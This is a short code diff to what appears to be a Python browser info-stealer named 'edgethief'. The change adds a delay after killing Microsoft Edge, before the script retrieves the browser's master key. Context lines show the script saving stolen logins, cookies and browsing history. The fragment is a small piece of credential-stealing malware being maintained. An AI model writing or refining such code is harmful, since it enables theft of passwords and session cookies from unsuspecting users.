@@ -126,6 +126,7 @@ def save_results(logins, cookies, history):
 
 def edgethief():
     kill_edge()
+    time.sleep(2)
     master_key = get_master_key()
     if not master_key:
         print("Failed to retrieve master key.")
